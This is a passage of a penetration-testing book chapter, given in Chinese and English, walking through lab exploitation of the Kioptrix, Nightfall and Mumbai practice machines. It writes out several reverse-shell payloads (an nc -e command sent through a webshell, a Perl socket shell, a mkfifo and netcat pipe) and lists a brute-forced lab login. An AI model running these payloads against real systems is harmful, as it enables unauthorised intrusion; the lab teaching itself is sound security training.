  trans: "\n\n![](img/Figure-8.22.jpg)\n\n**图 8.22:** 在 `rce.php` webshell 上执行 `id`\
    \ 命令\n\n`id` 命令在 Kioptrix 目标上执行成功，我们可以看到可以以 `www` 用户的权限运行命令。\n\n让我们找到在目标上获取完全交互式\
    \ shell 的方法，首先通过向 web shell 发命令 `find / -name nc` 来检查目标系统上是否安装了 `netcat` 命令。\n\
    \n直接将命令发送到 web shell 是不起作用，因为它无法正确处理特殊字符，因此，为了让命令在目标上执行，我们必须在发送之前使用 `--data-urlencode`\
    \ 标志对字符串进行编码。\n\n![](img/Figure-8.23.jpg)\n\n**图 8.23:** 通过 `rce.php` 寻找 netcat\
    \ 是否存在\n\n命令显示目标上安装了 `netcat`，且 `nc` 二进制文件位于 `/usr/bin` 目录。我们现在现在 Kali 系统上启动一个\
    \ `netcat` 监听器。\n\n在我们的 Kali 系统上启动 `netcat` 监听器，并配置其监听端口 9877 上的连接。\n\n![](img/Figure-8.24.jpg)\n\
    \n**图 8.24:** 设置 netcat 监听器\n\n我们的监听器已成功建立，现在我们返回使用以下命令执行反弹 shell 负载：\n\n```\n\
    curl -A \"Mozilla/4.0 Mozilla_4browser\" -G \"http://10.0.2.104:8080/phptax/data/rce.php\"\
    \ --data-urlencode \"cmd=nc -e /bin/sh 10.0.2.238 9877\"\n```\n\n命令在目标上执行了，但我们的监听器上没有返回\
    \ shell。参考 [`www.freebsd.org/cgi/man.cgi?nc`](https://www.freebsd.org/cgi/man.cgi?nc)\
    \ 上的 FreeBSD 手页告诉我们，`-e` 选项在 FreeBSD 的 `netcat` 实现中用法不同，它不支持执行二进制文件。我们必须尝试其他替代方法来获取目标上的\
    \ shell。\n\nPentestmonkey 的反弹 shell 备备表包含了许多无需 `netcat` 即可获取 shell 的脚本。[`pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)。\n\
    \n让我们使用上述备备表中的一个 Perl 脚本并修改 IP 和端口地址：\n\n```\nperl -e 'use Socket;$i=\"10.0.2.238\"\
    ;$p=9877;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\
    >&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n\
    \n前面的脚本包含许多特殊字符，如 `- ;&>`，这些字符会被我们本地的 bash shell 和 `curl` 解析，而不是作为负载传递给目标。\n\n\
    为了避免这个陷阱，我们使用使用在线工具 [`www.urlencoder.org/`](https://www.urlencoder.org/) 使用 URL\
    \ 编码对负载进行编码。\n\n![](img/Figure-8.25.jpg)\n\n**图 8.25:** 使用 www.urlencoder.org\
    \ 对反弹 shell 负载进行编码\n\n之前的截图显示了页面底部的 URL 编码负载。\n\n**信息：此编码过程也可以使用 Burpsuite 或 Firefox\
    \ 的 HackBar 插件离线完成。**\n\n使用下面的 `curl` 命令配合编码后的负载在我们的 `netcat` 监听器上获取 shell：\n\n\
    ```\ncurl -A \"Mozilla/4.0 Mozilla_4browser\" http://10.0.2.104:8080/phptax/data/rce.php?cmd=<PAYLOAD>\n\
    ```\n\n![](img/Figure-8.26.jpg)\n\n**图 8.26:** 使用 `curl` 执行反弹 shell 负载\n\n`curl`\
    \ 命令显示终端上出现了一个闪烁的光标，意味着脚本在目标上运行成功，让我们检查端口 9877  `netcat` 监听器是否有反弹 shell 连接。\n\n\
    ![](img/Figure-8.27.jpg)\n\n**图 8.27:** netcat 监听器上的反弹 shell\n\n负载成功了。你应该已经从目标收到了\
    \ `netcat` 监听器的反弹 shell 连接，运行“id’ 命令显示我们已经获得了 `www` 用户和组的权限。\n\n记录到为止的观察结果，我们将在下一章继续这台机器。\n\
    \n**观察笔记：**\n\n- **IP 地址：** 10.0.2.104\n- **操作系统：** FreeBSD\n- **开放端口与服务：**\n\
    \    * 80/tcp http\n        * Apache httpd 2.2.21\n        * mod_ssl/2.2.21\n\
    \        * OpenSSL/0.9.8q\n        * DAV/2 PHP/5.3.8\n        * 发现 pChart 应用程序：http://10.0.2.104/pChart2.1.3/index.php\n\
    \            * 发现漏洞\n![](img/ent.jpg)\n\n"
- fmt: "\nTake notes on the observations made so far, and we will continue with this\
    \ machine in the next chapter.\n\n## Observation Notes:\n\n**IP address:** 10.0.2.4\n\
    \n**Operating System:** Ubuntu Linux\n\n**Open Ports & Services:**\n\n- `22/tcp`\
    \ SSH\n  - `OpenSSH 7.2p2 Ubuntu 4ubuntu2.7`\n  - Exploits Found\n    - `OpenSSH\
    \ 7.2p2 - Username Enumeration | exploits/linux/remote/40136.py`\n    - `OpenSSHd\
    \ 7.2p2 - Username Enumeration | exploits/linux/remote/40113.txt`\n- `8000/tcp`\
    \ HTTP\n  - `Apache httpd 2.4.25`\n  - Exploits found\n    - `Apache 2.4.17 <\
    \ 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n    - `Apache < 2.2.34\
    \ / < 2.4.27 - OPTIONS M | exploits/linux/webapps/42745.py`\n  - `WordPress 5.0.3`\n\
    \  - Exploit found\n    - `WordPress Plugin Quick Page/Post Redir | exploits/php/webapps/32867.txt`\n\
    - `http-robots.txt`: 2 disallowed entries\n- `/upload.php`\n\npage source available\
    \ on [https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php](https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php)\n\
    \nGIF and PNG files are allowed, uploaded files are renamed to `md5-hash(filename\
    \ + random number 1-100).ext` and stored in `/uploads` directory.\n\nBasic webshell\
    \ `cmd.php` with `GIF89a` tag was uploaded to the server.\n\nWebserver is running\
    \ with privileges of user `www-data`.\n\nNetcat reverse shell established with\
    \ privileges of user `www-data`.\n\n- `/uploads`\n\n# Sunset:Nightfall\n\nContinuing\
    \ from the research phase for Nightfall target from the previous chapter, where\
    \ we generated and uploaded the `authorized_keys` in the `.ssh` directory using\
    \ user `matt`’s credentials. Since the setup has been done obtaining access to\
    \ the target via ssh is going to be fairly simple.\n\nWe had also identified one\
    \ potential exploit for the Apache 2.4.38 server which was found to be running\
    \ on the target system.\n\n`Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n\
    \nBefore you move on to the juicy bit of gaining access via ssh, open up a terminal\
    \ session and examine the `46676.php` exploit using the `cat <filename>` command.\n\
    \n![](images/Figure-8.32.jpg)\n\n**Figure 8.32:** `46676.php` exploit source code\n\
    \nMake your observations regarding the applicability of this exploit and move\
    \ on to the next step.\n\nEstablish access to `matt`’s account on the Nightfall\
    \ target by executing the command `ssh matt@10.0.2.5` and accept the ECDSA fingerprint\
    \ by typing yes.\n\n![](images/Figure-8.33.jpg)\n\n**Figure 8.33:** SSH access\
    \ successful for user `matt` using public key\n\nWe have successfully obtained\
    \ access to the system as user `matt`.\n\nTake notes on the observations made\
    \ so far, and we will continue with this machine in the next chapter.\n\n## Observation\
    \ Notes:\n\n**IP address:** 10.0.2.5\n\n**Operating System:** Debian Linux\n\n\
    **Open Ports & Services:**\n\n- `21/tcp` ftp\n  - `pyftpdlib 1.5.5`\n  - User:`matt:Password:cheese`\
    \ (via bruteforce attack using `hydra`)\n  - Uploaded `authorized_keys` to `.ssh`\
    \ folder inside user `matt`’s home directory\n- `22/tcp` ssh\n  - `OpenSSH 7.9p1\
    \ Debian 10 (protocol 2.0)`\n  - Login obtained for user `matt` using `sshauthorized_keys`.\n\
    - `80/tcp` http\n  - `Apache httpd 2.4.38 ((Debian))`\n  - Exploit found\n   \
    \ - `Apache 2.4.17 < 2.4.38 - 'apache2ctl g | exploits/linux/local/46676.php`\n\
    - `139/tcp` netbios-ssn\n  - `Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`\n \
    \ - Found users: `matt`, `nightfall`\n- `445/tcp` netbios-ssn\n  - `Samba smbd\
    \ 3.X - 4.X (workgroup: WORKGROUP)`\n- `3306/tcp` mysql\n  - `MySQL 5.5.5-10.3.15-MariaDB-1`\n\
    \  - Login denied for user `matt`\n- `137/udp` netbios-ns\n  - `Samba nmbdnetbios-ns\
    \ (workgroup: WORKGROUP)`\n- `5353/udp` dns\n  - `DNS-based service discovery\n\
    \n# Mumbai\n\nResearch phase for Mumbai target concluded after identification\
    \ of a command injection vulnerability within the `query` parameter of the `test.php`\
    \ API running on port 8000.\n\nWe had also identified two potential exploits for\
    \ the Apache service running on the target system.\n\n`Apache 2.4.17 < 2.4.38\
    \ - 'apache2ctl g | exploits/linux/local/46676.php`\n\n`Apache < 2.2.34 / < 2.4.27\
    \ - OPTIONS M | exploits/linux/webapps/42745.py`\n\nWe will start by using the\
    \ command injection vulnerability and leverage it to obtain a full reverse shell.\n\
    \nLet’s check whether `netcat` is installed on the target system by using the\
    \ `whereis nc` command:\n\n![](images/Figure-8.34.jpg)\n\n**Figure 8.34:** Exploiting\
    \ command injection vulnerability to find netcat\n\nNetcat is installed on the\
    \ target system, however, as shown in the screenshot the installed version is\
    \ `nc.openbsd` which is different from the traditional version and doing some\
    \ research on the internet [http://manpages.ubuntu.com/manpages/bionic/man1/nc_openbsd.1.html](http://manpages.ubuntu.com/manpages/bionic/man1/nc_openbsd.1.html)\
    \ mentions that it does not support `-e` execute option just like its FreeBSD\
    \ cousin, we will have to use alternate means to obtain a reverse shell.\n\nLet’s\
    \ begin by running a `netcat` listener on our Kali system, and configure it to\
    \ receive incoming connections on port 9879.\n\n![](images/Figure-8.35.jpg)\n\n\
    **Figure 8.35:** Setting up netcat listener\n\nOur listener setup is complete\
    \ and waiting for connections on port 9879, let’s move to finding alternative\
    \ approaches to get a reverse shell.\n\nIn this example, we will use input output\
    \ redirection wizadry that we learnt in [Chapter 3, Finding your Way Around Kali\
    \ Linux](#c03.xhtml) to send out a shell to our Kali system despite the missing\
    \ `-e` flag.\n\nThe command string to achieve this is given as follows:\n\n```bash\n\
    rm /tmp/fifo;mknod /tmp/fifo p;/bin/sh 0</tmp/fifo|nc 10.0.2.238 9879 1>/tmp/fifo;done\n\
    ```\n\nLet’s send the payload to the target, and wait for an incoming connection.\n\
    \n![](images/Figure-8.36.jpg)\n\n**Figure 8.36:** Executing reverse shell payload\
    \ using command injection vulnerability\n\nThe command sting above creates a named\
    \ pipe file called `fifo` inside the `/tmp` directory, the contents of the `fifo`\
    \ file are fed as STDIN input to `/bin/sh` and the responses from `sh` are piped\
    \ to `netcat` binary which in-turn sends an outbound connection to our Kali system\
    \ on port 9879\\. Finally, any STDOUT data received from `netcat` is written back\
    \ into the `fifo` file which gets parsed by the `/bin/sh` shell thus completing\
    \ the loop and giving us a fully working reverse shell.\n\n![](images/Figure-8.37.jpg)\n\
    \n**Figure 8.37:** Reverse shell connect back on netcat listener\n\nThe remote\
    \ `netcat` gave sent a working reverse shell, we were able to execute the `id`\
    \ command on the target. The `id` command output shows that we currently have\
    \ privileges of `apiuser`, and are a member of the `docker` group.\n\nTake notes\
    \ on the observations made so far, and we will continue with this machine in the\
    \ next chapter.\n\n## Observation Notes:\n\n**IP address:** 10.0.2.6\n\n**Operating\
    \ System:** Ubuntu Linux\n\n**Open Ports & Services:**\n\n- `21/tcp` ftp\n  -\
    \ `vsftpd 3.0.3`\n  - Anonymous FTP allowed, file `Note` revealed security issues\n\
    - `22/tcp` ssh\n  - `OpenSSH 7.6p1 Ubuntu`\n- `80/tcp` http\n  - `Apache httpd\
    \ 2.4.29`\n  - Exploits found\n    - `Apache 2.4.17 < 2.4.38 - 'apache2ctl g |\
    \ exploits/linux/local/46676.php`\n    - `Apache < 2.2.34 / < 2.4.27 - OPTIONS\
    \ M | exploits/linux/webapps/42745.py`\n  - `WordPress 5.2.3`\n  - XMLRPC was\
    \ enabled which could lead to security issues\n  - User `absozedfound`\n- `3306/tcp`\
    \ mysql\n  - `MySQL 5.5.5-10.3.15-MariaDB-1`\n- `8000/tcp` http\n  - `nginx 1.14.0`\n\
    \  - `.bash*` files found suggesting that the web root might be user’s home directory\n\
    \  - Docker container was built by a system user and `/api` directory was added\
    \ to the `PATH` variable.\n  - API `http://10.0.2.6:8000/test.php` which executes\
    \ a python script `keywords.py` for producing word count.\n  - API is vulnerable\
    \ to command injection using symbols `;`, `|` and `%0a`\n\nNetcat did not support\
    \ execution functionality\n\nReverse shell obtained reverse shell using command\
    \ piping and input/output redirection.\n\n# Conclusion\n\nThis chapter we covered\
    \ the tools and techniques used to exploit vulnerabilities on the target system.\
    \ Additionally, we learnt about automated, manual exploitation, through hands-on\
    \ exercises.\n"
